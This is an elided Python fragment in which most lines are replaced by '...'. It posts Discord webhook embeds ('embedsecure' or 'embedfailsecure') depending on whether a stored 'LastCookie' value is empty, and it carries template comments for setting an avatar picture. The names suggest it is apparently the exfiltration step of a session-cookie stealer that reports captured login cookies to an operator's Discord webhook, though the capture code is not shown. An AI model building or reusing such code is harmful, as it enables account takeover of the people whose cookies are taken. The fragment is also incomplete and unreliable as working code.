        ...
        if data.get("webhook") is None:
            ...
            async with aiohttp.ClientSession() as session:
                ...
                if config.LastCookie == "": #Fail Code
                    ...
                    await webhook.send(embed=embedfailsecure, username=inty2, avatar_url="https://images-ext-1.discordapp.net/external/LnVNiJsKjqyx7t7nb7dF5TbvU2JbXDLFN049yxOGzsc/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1367298787160363008/09ed1aac2a4b9e75e806d1d5c973e929.webp?format=webp&width=326&height=326") # Put a picture link here
                else: 
                    ...
                    webhook = Webhook.from_url(data["webhook"], session=session)
                    await webhook.send(embed=embedsecure, username=inty2, avatar_url="https://images-ext-1.discordapp.net/external/LnVNiJsKjqyx7t7nb7dF5TbvU2JbXDLFN049yxOGzsc/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1367298787160363008/09ed1aac2a4b9e75e806d1d5c973e929.webp?format=webp&width=326&height=326") # Put a picture link here
